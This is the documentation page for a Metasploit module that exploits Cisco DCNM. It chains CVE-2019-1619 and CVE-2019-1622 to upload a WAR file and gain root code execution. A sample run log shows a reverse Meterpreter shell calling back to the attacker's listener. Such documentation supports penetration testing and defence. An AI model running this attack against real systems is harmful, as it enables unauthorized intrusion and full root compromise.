{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/http/cisco_dcnm_upload_2019","result":{"data":{"moduleMetadataJson":{"id":"f2ed9cab-746c-525c-9655-4bd76be50e51","name":"Cisco Data Center Network Manager Unauthenticated Remote Code Execution","fullname":"exploit/multi/http/cisco_dcnm_upload_2019","description":"DCNM exposes a file upload servlet (FileUploadServlet) at /fm/fileUpload.\n        An authenticated user can abuse this servlet to upload a WAR to the Apache Tomcat webapps\n        directory and achieve remote code execution as root.\n        This module exploits two other vulnerabilities, CVE-2019-1619 for authentication bypass on\n        versions 10.4(2) and below, and CVE-2019-1622 (information disclosure) to obtain the correct\n        directory for the WAR file upload.\n        This module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should\n        work on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit\n        (see References to understand why).","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/http/cisco_dcnm_upload_2019","documentationSlug":"/modules/documentation/exploit/multi/http/cisco_dcnm_upload_2019","referencesSlug":"/modules/references/exploit/multi/http/cisco_dcnm_upload_2019"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>Cisco Data Center Network Manager exposes a file upload servlet (FileUploadServlet) at /fm/fileUpload.\nAn authenticated user can abuse this servlet to upload a WAR to the Apache Tomcat webapps\ndirectory and achieve remote code execution as root.</p>\n<p>This module exploits two other vulnerabilities, CVE-2019-1619 for authentication bypass on\nversions 10.4(2) and below, and CVE-2019-1622 (information disclosure) to obtain the correct\ndirectory for the WAR file upload.</p>\n<p>The module was tested on the DCNM Linux virtual appliance 10.4(2), 11.0(1) and 11.1(1), and should\nwork on a few versions below 10.4(2). Only version 11.0(1) requires authentication to exploit\n(see References to understand why).</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p>Setup RHOST, LHOST, LPORT, run it and sit back!</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">[*] Started reverse TCP handler on 10.75.1.1:4444\n[+] 10.75.1.40:443 - Detected DCNM 11.1(1)\n[*] 10.75.1.40:443 - No authentication required, ready to exploit!\n[+] 10.75.1.40:443 - Obtain WAR path from logs: /usr/local/cisco/dcm/wildfly-10.1.0.Final/standalone/sandeployments\n[*] 10.75.1.40:443 - Uploading payload...\n[+] 10.75.1.40:443 - WAR uploaded, waiting a few seconds for deployment...\n[*] 10.75.1.40:443 - Executing payload...\n[*] Sending stage (53867 bytes) to 10.75.1.40\n[*] Meterpreter session 1 opened (10.75.1.1:4444 -&gt; 10.75.1.40:60592) at 2019-08-29 12:41:49 +0700\n\nmeterpreter &gt; getuid\nServer username: root\nmeterpreter &gt; exit\n[*] Shutting down Meterpreter...\n[*] 10.75.1.40 - Meterpreter session 1 closed.  Reason: User exit</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"f2ed9cab-746c-525c-9655-4bd76be50e51"}}}